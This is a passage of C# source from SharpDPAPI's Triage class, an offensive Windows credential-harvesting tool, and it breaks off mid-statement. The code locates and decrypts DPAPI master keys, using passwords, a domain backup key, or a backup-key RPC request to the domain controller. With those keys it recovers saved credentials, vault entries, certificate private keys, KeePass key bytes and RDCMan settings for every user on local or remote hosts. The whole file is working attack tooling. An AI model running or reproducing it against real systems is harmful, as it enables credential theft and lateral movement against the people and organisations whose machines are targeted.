using System;
using System.Collections.Generic;
using System.DirectoryServices.ActiveDirectory;
using System.IO;
using System.Net;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;

namespace SharpDPAPI
{
    public class Triage
    {
        public static Dictionary<string, string> TriageUserMasterKeys(byte[] backupKeyBytes, bool show = false, string computerName = "", 
            string password = "", string target = "", string userSID = "", bool dumpHash = false, bool rpc = false)
        {
            // triage all *user* masterkeys we can find, decrypting if the backupkey is supplied
            
            var mappings = new Dictionary<string, string>();
            var preferred = new Dictionary<string, string>();
            var canAccess = false;

            if (!String.IsNullOrEmpty(target))
            {
                // if we're targeting specific masterkey files
                if (((backupKeyBytes == null) || (backupKeyBytes.Length == 0)) && String.IsNullOrEmpty(userSID))
                {
                    // currently only backupkey is supported
                    Console.WriteLine("[X] The masterkey '/target:X' option currently requires '/pvk:BASE64...' or '/password:X'");
                    return mappings;
                }

                if (!File.Exists(target) && !Directory.Exists(target))
                {
                    Console.WriteLine($"[X] The target '{target}' doesn't exist!");
                    return mappings;
                }

                KeyValuePair<string, string> plaintextMasterKey = default;

                if ((File.GetAttributes(target) & FileAttributes.Directory) == FileAttributes.Directory)
                {
                    // if we're triaging a folder of masterkeys
                    var files = Directory.GetFiles(target);
                    foreach (var file in files)
                    {
                        try
                        {
                            FileInfo f = new FileInfo(file);

                            if (f.Name.ToLower() == "preferred" && f.Length == 24)
                                preferred.Add(target, Dpapi.GetPreferredKey(file));

                            if (Helpers.IsGuid(f.Name))
                            {
                                var masterKeyBytes = File.ReadAllBytes(file);
                                if ((backupKeyBytes != null) && (backupKeyBytes.Length != 0))
                                {
                                    plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
                                }
                                else if (!String.IsNullOrEmpty(password) && !String.IsNullOrEmpty(userSID))
                                {
                                    byte[] hmacBytes = Dpapi.CalculateKeys(password, "", true, userSID);
                                    plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
                                }
                                else if (dumpHash)
                                {
                                    userSID = !String.IsNullOrEmpty(userSID) ? userSID : Dpapi.ExtractSidFromPath(file);
                                    plaintextMasterKey = Dpapi.FormatHash(masterKeyBytes, userSID);
                                }

                                if (!plaintextMasterKey.Equals(default(KeyValuePair<string, string>)))
                                    mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                            }
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[X] Error triaging masterkey target '{0}' : {1}", target, e.Message);
                        }
                    }
                }
                else
                {
                    // otherwise we're triaging one file
                    try
                    {
                        var masterKeyBytes = File.ReadAllBytes(target);
                        if ((backupKeyBytes != null) && (backupKeyBytes.Length != 0))
                        {
                            plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
                        }
                        else if (!String.IsNullOrEmpty(password))
                        {
                            byte[] hmacBytes = Dpapi.CalculateKeys(password, "", true, userSID);
                            plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
                        }
                        else if (dumpHash)
                        {
                            userSID = !String.IsNullOrEmpty(userSID) ? userSID : Dpapi.ExtractSidFromPath(target);
                            plaintextMasterKey = Dpapi.FormatHash(masterKeyBytes, userSID);
                        }

                        if (!plaintextMasterKey.Equals(default(KeyValuePair<string, string>)))
                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[X] Error triaging masterkey target '{0}' : {1}", target, e.Message);
                    }
                }
            }

            else
            {
                if (!String.IsNullOrEmpty(computerName))
                {
                    canAccess = Helpers.TestRemote(computerName);
                    if (!canAccess)
                    {
                        return new Dictionary<string, string>();
                    }
                }

                string[] userDirs;

                if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && canAccess))
                {
                    // if elevated, triage ALL reachable masterkeys

                    var userFolder = !String.IsNullOrEmpty(computerName) ?
                        $"\\\\{computerName}\\C$\\Users\\" :
                        $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";

                    userDirs = Directory.GetDirectories(userFolder);
                }
                else
                {
                    // otherwise we're only triaging the current user's path
                    userDirs = new string[] { Environment.GetEnvironmentVariable("USERPROFILE") };
                }

                foreach (var dir in userDirs)
                {
                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                        continue;

                    var userDPAPIBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
                    if (!Directory.Exists(userDPAPIBasePath))
                        continue;

                    var directories = Directory.GetDirectories(userDPAPIBasePath);
                    foreach (var directory in directories)
                    {
                        var files = Directory.GetFiles(directory);
                        var isDomain = false;
                        byte[] hmacBytes = null;

                        foreach (var file in files)
                        {
                            // if the BK-<NETBIOSDOMAINNAME> file exists, assume this is a domain user.
                            if (Regex.IsMatch(file, @".*\\BK-[0-9A-Za-z]+"))
                            {
                                isDomain = true; // means use the NTLM of the user password instead of the SHA1
                            }
                        }

                        if (!String.IsNullOrEmpty(password))
                        {
                            hmacBytes = Dpapi.CalculateKeys(password, directory, isDomain);
                        }

                        foreach (var file in files)
                        {
                            if (Path.GetFileName(file).ToLower() == "preferred" && new FileInfo(file).Length == 24)
                                preferred.Add(directory, Dpapi.GetPreferredKey(file));

                            if (!Regex.IsMatch(file, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                                continue;

                            if (show)
                            {
                                Console.WriteLine("[*] Found MasterKey : {0}", file);
                            }

                            var masterKeyBytes = File.ReadAllBytes(file);
                            try
                            {
                                KeyValuePair<string, string> plaintextMasterKey = default;
                                if (!String.IsNullOrEmpty(password))
                                {
                                    plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masterKeyBytes, hmacBytes);
                                }
                                else if (backupKeyBytes != null)
                                {
                                    plaintextMasterKey = Dpapi.DecryptMasterKey(masterKeyBytes, backupKeyBytes);
                                }
                                else if (dumpHash)
                                {
                                    userSID = !String.IsNullOrEmpty(userSID) ? userSID : Dpapi.ExtractSidFromPath(file);
                                    plaintextMasterKey = Dpapi.FormatHash(masterKeyBytes, userSID, isDomain ? 3 : 1);
                                }
                                else if(rpc && isDomain)
                                {
                                    DirectoryContext mycontext = new DirectoryContext(DirectoryContextType.Domain, System.Environment.UserDomainName);
                                    DomainController dc = DomainController.FindOne(mycontext);
                                    IPAddress DCIPAdress = IPAddress.Parse(dc.IPAddress);

                                    var bkrp = new Bkrp();
                                    bkrp.Initialize(DCIPAdress.ToString(), System.Environment.UserDomainName);
                                    var keyBytes = bkrp.BackuprKey(SharpDPAPI.Dpapi.GetDomainKey(masterKeyBytes));
                                    var guid = $"{{{Encoding.Unicode.GetString(masterKeyBytes, 12, 72)}}}";
                                    var sha1 = new SHA1CryptoServiceProvider();
                                    var masterKeySha1 = sha1.ComputeHash(keyBytes);
                                    var masterKeySha1Hex = BitConverter.ToString(masterKeySha1).Replace("-", "");
                                    mappings.Add(guid, masterKeySha1Hex);
                                }

                                if (!plaintextMasterKey.Equals(default(KeyValuePair<string, string>)))
                                    mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                            }
                            catch (Exception)
                            {
                                // Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                            }
                        }
                    }
                }
            }

            if (show && preferred.Count != 0)
            {
                Console.WriteLine("\n[*] Preferred master keys:\r\n");
                foreach (var kvp in preferred)
                {
                    Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                }
            }

            if (!String.IsNullOrEmpty(password))
            {
                if (mappings.Count == 0)
                {
                    Console.WriteLine("\n[!] No master keys decrypted!\r\n");
                }
                else
                {
                    Console.WriteLine("\n[*] User master key cache:\r\n");
                    foreach (var kvp in mappings)
                    {
                        Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
                    }
                    Console.WriteLine();
                }
            }

            Console.WriteLine();
            return mappings;
        }

        public static Dictionary<string, string> TriageSystemMasterKeys(bool show = false)
        {
            // retrieve the DPAPI_SYSTEM key and use it to decrypt any SYSTEM DPAPI masterkeys

            var mappings = new Dictionary<string, string>();

            if (Helpers.IsHighIntegrity())
            {
                // get the system and user DPAPI backup keys, showing the machine DPAPI keys
                //  { machine , user }

                var keys = LSADump.GetDPAPIKeys(true);
                Helpers.GetSystem();
                var systemFolder =
                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\System32\\Microsoft\\Protect\\";

                var systemDirs = Directory.GetDirectories(systemFolder);

                foreach (var directory in systemDirs)
                {
                    var machineFiles = Directory.GetFiles(directory);
                    var userFiles = new string[0];

                    if (Directory.Exists($"{directory}\\User\\"))
                    {
                        userFiles = Directory.GetFiles($"{directory}\\User\\");
                    }

                    foreach (var file in machineFiles)
                    {
                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                            continue;

                        var fileName = Path.GetFileName(file);
                        if (show)
                        {
                            Console.WriteLine("[*] Found SYSTEM system MasterKey : {0}", file);
                        }

                        var masteyKeyBytes = File.ReadAllBytes(file);
                        try
                        {
                            // use the "machine" DPAPI key
                            var plaintextMasterkey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[0]);
                            mappings.Add(plaintextMasterkey.Key, plaintextMasterkey.Value);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                        }
                    }

                    foreach (var file in userFiles)
                    {
                        if (!Regex.IsMatch(file, @".*\\[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                            continue;

                        var fileName = Path.GetFileName(file);
                        if (show)
                        {
                            Console.WriteLine("[*] Found SYSTEM user MasterKey : {0}", file);
                        }

                        var masteyKeyBytes = File.ReadAllBytes(file);
                        try
                        {
                            // use the "user" DPAPI key
                            var plaintextMasterKey = Dpapi.DecryptMasterKeyWithSha(masteyKeyBytes, keys[1]);
                            mappings.Add(plaintextMasterKey.Key, plaintextMasterKey.Value);
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM masterkeys!\r\n");
            }

            return mappings;
        }

        public static void TriageUserCreds(Dictionary<string, string> MasterKeys, string computerName = "")
        {
            // triage all *user* Credential files we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                var canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Credentials for ALL users\r\n");

                var userFolder = !String.IsNullOrEmpty(computerName) ?
                    $"\\\\{computerName}\\C$\\Users\\" :
                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";

                var dirs = Directory.GetDirectories(userFolder);

                foreach (var dir in dirs)
                {
                    var parts = dir.Split('\\');
                    var userName = parts[parts.Length - 1];

                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                        continue;

                    var credentialFilePaths = new string[]
                    {
                        $"{dir}\\AppData\\Local\\Microsoft\\Credentials\\",
                        $"{dir}\\AppData\\Roaming\\Microsoft\\Credentials\\"
                    };

                    foreach (var path in credentialFilePaths)
                    {
                        if (Directory.Exists(path))
                            TriageCredFolder(path, MasterKeys);
                    }
                }
            }
            else
            {
                // otherwise just triage the current user's credential folder
                Console.WriteLine("[*] Triaging Credentials for current user\r\n");

                var credentialFilePaths = new string[]
                {
                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Local\\Microsoft\\Credentials\\",
                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\Microsoft\\Credentials\\"
                };

                foreach (var path in credentialFilePaths)
                {
                    if (Directory.Exists(path))
                        TriageCredFolder(path, MasterKeys);
                }
            }
        }

        public static void TriageUserVaults(Dictionary<string, string> MasterKeys, string computerName = "")
        {
            // triage all *user* vaults we can reach

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                var canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging Vaults for ALL users\r\n");

                var userFolder = "";
                userFolder = !String.IsNullOrEmpty(computerName) ?
                    $"\\\\{computerName}\\C$\\Users\\" :
                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";

                var dirs = Directory.GetDirectories(userFolder);

                foreach (var dir in dirs)
                {
                    var parts = dir.Split('\\');
                    var userName = parts[parts.Length - 1];
                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                        continue;

                    string[] folderLocations =
                    {
                        $"{dir}\\AppData\\Local\\Microsoft\\Vault\\",
                        $"{dir}\\AppData\\Roaming\\Microsoft\\Vault\\"
                    };

                    foreach (var location in folderLocations)
                    {
                        if (!Directory.Exists(location))
                            continue;

                        var vaultDirs = Directory.GetDirectories(location);
                        foreach (var vaultDir in vaultDirs)
                        {
                            if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                            {
                                TriageVaultFolder(vaultDir, MasterKeys);
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("[*] Triaging Vaults for the current user\r\n");

                var vaultPaths = new string[]
                {
                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Local\\Microsoft\\Vault\\",
                    $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\Microsoft\\Vault\\"
                };

                foreach (var vaultPath in vaultPaths)
                {
                    if (!Directory.Exists(vaultPath))
                        continue;

                    var vaultDirs = Directory.GetDirectories(vaultPath);
                    foreach (var vaultDir in vaultDirs)
                    {
                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            TriageVaultFolder(vaultDir, MasterKeys);
                        }
                    }
                }
            }
        }

        public static void TriageSystemCreds(Dictionary<string, string> MasterKeys)
        {
            // triage all *SYSTEM* cred files we can reach

            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[*] Triaging System Credentials\r\n");

                // all the SYSTEM Credential file locations
                string[] folderLocations =
                {
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials"
                };

                foreach (var location in folderLocations)
                {
                    if (!Directory.Exists(location))
                        continue;

                    TriageCredFolder(location, MasterKeys);
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM credentials!\r\n");
            }
        }

        public static void TriageSystemVaults(Dictionary<string, string> MasterKeys)
        {
            // triage all *SYSTEM* vaults we can reach

            if (Helpers.IsHighIntegrity())
            {
                Console.WriteLine("\r\n[*] Triaging SYSTEM Vaults\r\n");

                string[] folderLocations =
                {
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Vault",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Vault",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Vault",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Vault",
                    $"{Environment.GetEnvironmentVariable("SystemRoot")}\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Vault"
                };

                foreach (var location in folderLocations)
                {
                    if (!Directory.Exists(location))
                        continue;

                    var vaultDirs = Directory.GetDirectories(location);
                    foreach (var vaultDir in vaultDirs)
                    {
                        if (Regex.IsMatch(vaultDir, @"[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}"))
                        {
                            TriageVaultFolder(vaultDir, MasterKeys);
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("\r\n[X] Must be elevated to triage SYSTEM vaults!\r\n");
            }
        }

        public static void TriageVaultFolder(string folder, Dictionary<string, string> MasterKeys)
        {
            // takes a Vault folder, extracts the AES 128/256 keys from Policy.vpol, and uses these
            //  to decrypt any .vcrd vault credentials

            var policyFilePath = $"{folder}\\Policy.vpol";
            if (!File.Exists(policyFilePath))
                return;
            Console.WriteLine("\r\n[*] Triaging Vault folder: {0}", folder);

            var policyBytes = File.ReadAllBytes(policyFilePath);

            // first try to get vault keys from the Policy.vpol
            var keys = Dpapi.DescribeVaultPolicy(policyBytes, MasterKeys);

            // make sure we have keys returned
            if (keys.Count <= 0)
                return;

            var vaultCredFiles = Directory.GetFiles(folder);
            if ((vaultCredFiles == null) || (vaultCredFiles.Length == 0))
                return;

            foreach (var vaultCredFile in vaultCredFiles)
            {
                var fileName = Path.GetFileName(vaultCredFile);

                if (!fileName.EndsWith("vcrd"))
                    continue;

                try
                {
                    var vaultCredBytes = File.ReadAllBytes(vaultCredFile);
                    // describe the vault credential file using the Policy credentials
                    Dpapi.DescribeVaultCred(vaultCredBytes, keys);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[X] Error triaging {0} : {1}", vaultCredFile, e.Message);
                }
            }
        }

        public static void TriageCredFolder(string folder, Dictionary<string, string> MasterKeys)
        {
            // triage a specific credential folder
            var systemFiles = Directory.GetFiles(folder);
            if (systemFiles.Length == 0)
                return;

            Console.WriteLine("\r\nFolder       : {0}\r\n", folder);

            foreach (var file in systemFiles)
            {
                try
                {
                    TriageCredFile(file, MasterKeys);
                }
                catch (Exception e)
                {
                    Console.WriteLine("[X] Error triaging {0} : {1}", file, e.Message);
                }
            }
        }

        public static void TriageCredFile(string credFilePath, Dictionary<string, string> MasterKeys)
        {
            var fileName = Path.GetFileName(credFilePath);
            Console.WriteLine("  CredFile           : {0}\r\n", fileName);
            var credentialArray = File.ReadAllBytes(credFilePath);

            // describe and possibly parse the credential blob
            try
            {
                Dpapi.DescribeCredential(credentialArray, MasterKeys);
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Error triaging {0} : {1}", credFilePath, e.Message);
            }
            Console.WriteLine();
        }

        public static void TriageCertFile(string certFilePath, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false, bool unprotect = false)
        {
            // triage a certificate file

            var fileName = Path.GetFileName(certFilePath);
            var certificateBytes = File.ReadAllBytes(certFilePath);

            try
            {
                ExportedCertificate cert = Dpapi.DescribeCertificate(fileName, certificateBytes, MasterKeys, cng, alwaysShow, unprotect);

                if (cert.Thumbprint != "")
                {
                    Console.WriteLine("    Thumbprint       : {0}", cert.Thumbprint);
                    Console.WriteLine("    Issuer           : {0}", cert.Issuer);
                    Console.WriteLine("    Subject          : {0}", cert.Subject);
                    Console.WriteLine("    Valid Date       : {0}", cert.ValidDate);
                    Console.WriteLine("    Expiry Date      : {0}", cert.ExpiryDate);
                }

                if (cert.EKUs.Count > 0)
                {
                    Console.WriteLine("    Enhanced Key Usages:");
                    foreach (var eku in cert.EKUs)
                    {
                        Console.WriteLine("        {0} ({1})", eku.First, eku.Second);
                        if (eku.Second == "1.3.6.1.5.5.7.3.2")
                        {
                            Console.WriteLine("         [!] Certificate is used for client auth!");
                        }
                    }
                }

                if (cert.PrivateKey != "")
                {
                    Console.WriteLine("\r\n    [*] Private key file {0} was recovered:\r\n", fileName);
                    Console.WriteLine(cert.PrivateKey);
                    Console.WriteLine(cert.PublicCertificate);
                    Console.WriteLine();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Error triaging {0} : {1}", fileName, e.Message);
            }
        }

        public static void TriageCertFolder(string folder, Dictionary<string, string> MasterKeys, bool cng = false, bool alwaysShow = false, bool unprotect = false)
        {
            // triage a specific certificate folder
            if (!Directory.Exists(folder))
                return;

            var systemFiles = Directory.GetFiles(folder);
            if ((systemFiles.Length != 0))
            {
                Console.WriteLine("\nFolder       : {0}\r\n", folder);

                foreach (var file in systemFiles)
                {
                    if (Regex.IsMatch(file,
                        @"[0-9A-Fa-f]{32}[_][0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}")
                    )
                    {
                        TriageCertFile(file, MasterKeys, cng, alwaysShow, unprotect);
                    }
                }
            }
        }

        public static void TriageSystemCerts(Dictionary<string, string> MasterKeys, bool showall = false)
        {
            if (!Helpers.IsHighIntegrity())
                throw new PrivilegeNotHeldException("Must be elevated to triage SYSTEM certificate private keys!\r\n");

            Console.WriteLine("\r\n[*] Triaging System Certificates\r\n");

            // all the capi SYSTEM Credential file locations
            //  TODO are ajy missing? https://docs.microsoft.com/en-us/windows/win32/seccng/key-storage-and-retrieval#key-directories-and-files
            string[] capiFolderLocations =
            {
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys",
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-18",
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-19",
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-20"
                //$"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys" // maps to ProgramData from what I can tell
            };

            foreach (var location in capiFolderLocations)
            {
                TriageCertFolder(location, MasterKeys, false, showall);
            }

            // all the cng SYSTEM Credential file locations
            //  TODO are any missing? https://docs.microsoft.com/en-us/windows/win32/seccng/key-storage-and-retrieval#key-directories-and-files
            string[] cngFolderLocations =
            {
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\ProgramData\\Microsoft\\Crypto\\Keys",
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\ProgramData\\Microsoft\\Crypto\\SystemKeys",
                $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\Keys",
            };

            foreach (var location in cngFolderLocations)
            {
                TriageCertFolder(location, MasterKeys, true, showall);
            }
        }

        public static void TriageUserCerts(Dictionary<string, string> MasterKeys, string computerName = "", bool showall = false, bool unprotect = false)
        {
            string[] userDirs;
            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                var canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            //TODO have not verified with multiple users
            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                var userFolder = !String.IsNullOrEmpty(computerName) ?
                    $"\\\\{computerName}\\C$\\Users\\" :
                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";

                userDirs = Directory.GetDirectories(userFolder);
            }
            else
            {
                // otherwise we're only triaging the current user's path
                userDirs = new string[] { Environment.GetEnvironmentVariable("USERPROFILE") };
            }

            foreach (var dir in userDirs)
            {
                var parts = dir.Split('\\');
                var userName = parts[parts.Length - 1];
                if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                    continue;

                var userCapiKeysBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\";

                if (!Directory.Exists(userCapiKeysBasePath))
                    continue;

                var directories = Directory.GetDirectories(userCapiKeysBasePath);

                foreach (var directory in directories)
                {
                    TriageCertFolder(directory, MasterKeys, false, showall, unprotect);
                }

                var userCngKeysPath = $"{dir}\\AppData\\Roaming\\Microsoft\\Crypto\\Keys\\";

                if (!Directory.Exists(userCngKeysPath))
                    continue;

                TriageCertFolder(userCngKeysPath, MasterKeys, true, showall, unprotect);
            }
        }

        public static void TriageKeePassKeyFile(Dictionary<string, string> MasterKeys, string keyFilePath = "", bool unprotect = false) {
            
            if (!File.Exists(keyFilePath))
                return;

            var lastAccessed = File.GetLastAccessTime(keyFilePath);
            var lastModified = File.GetLastWriteTime(keyFilePath);

            Console.WriteLine("    File             : {0}", keyFilePath);
            Console.WriteLine("    Accessed         : {0}", lastAccessed);
            Console.WriteLine("    Modified         : {0}", lastModified);

            byte[] keyFileBytes = File.ReadAllBytes(keyFilePath);

            // entropy from KeePass source https://fossies.org/windows/misc/KeePass-2.47-Source.zip/KeePassLib/Keys/KcpUserAccount.cs (lines 44-47)
            byte[] keyBytes = Dpapi.DescribeDPAPIBlob(keyFileBytes, MasterKeys, "keepass", unprotect, Helpers.ConvertHexStringToByteArray("DE135B5F18A34670B2572429698898E6"));
            if(keyBytes.Length > 0)
            {
                Console.WriteLine("    Key Bytes        : {0}", BitConverter.ToString(keyBytes).Replace("-"," "));
            }
        }

        public static void TriageKeePass(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false)
        {
            // search for ProtectedUserKey.bin files, TriageKeePassKeyFile()

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                var canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging KeePass ProtectedUserKey.bin files for ALL users\r\n");

                var userFolder = "";
                userFolder = !String.IsNullOrEmpty(computerName) ?
                    $"\\\\{computerName}\\C$\\Users\\" :
                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";

                var dirs = Directory.GetDirectories(userFolder);

                foreach (var dir in dirs)
                {
                    var parts = dir.Split('\\');

                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                        continue;

                    var keyfilePath = $"{dir}\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin";
                    TriageKeePassKeyFile(MasterKeys, keyfilePath, unprotect);
                }
            }
            else
            {
                Console.WriteLine("[*] Triaging KeePass ProtectedUserKey.bin files for current user\r\n");
                var keyfilePath = $"{Environment.GetEnvironmentVariable("USERPROFILE")}\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin";
                TriageKeePassKeyFile(MasterKeys, keyfilePath, unprotect);
            }
        }

        public static void TriageRDCMan(Dictionary<string, string> MasterKeys, string computerName = "", bool unprotect = false)
        {
            // search for RDCMan.settings files, parsing any found with TriageRDCManFile()

            if (!String.IsNullOrEmpty(computerName))
            {
                // if we're triaging a remote computer, check connectivity first
                var canAccess = Helpers.TestRemote(computerName);
                if (!canAccess)
                {
                    return;
                }
            }

            if (Helpers.IsHighIntegrity() || (!String.IsNullOrEmpty(computerName) && Helpers.TestRemote(computerName)))
            {
                Console.WriteLine("[*] Triaging RDCMan.settings Files for ALL users\r\n");

                var userFolder = "";
                userFolder = !String.IsNullOrEmpty(computerName) ?
                    $"\\\\{computerName}\\C$\\Users\\" :
                    $"{Environment.GetEnvironmentVariable("SystemDrive")}\\Users\\";

                var dirs = Directory.GetDirectories(userFolder);

                foreach (var dir in dirs)
                {
                    var parts = dir.Split('\\');
                    var userName = parts[parts.Length - 1];

                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users"))
                        continue;

                    var userRDManFile = $"{dir}\\AppData\\Local\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.settings";
                    TriageRDCManFile(MasterKeys, userRDManFile, unprotect);
                }
            }
            else
            {
                Console.WriteLine("[*] Triaging RDCMan Settings Files for current user\r\n");
                var userName = Environment.GetEnvironmentVariable("USERNAME");
                var userRDManFile =
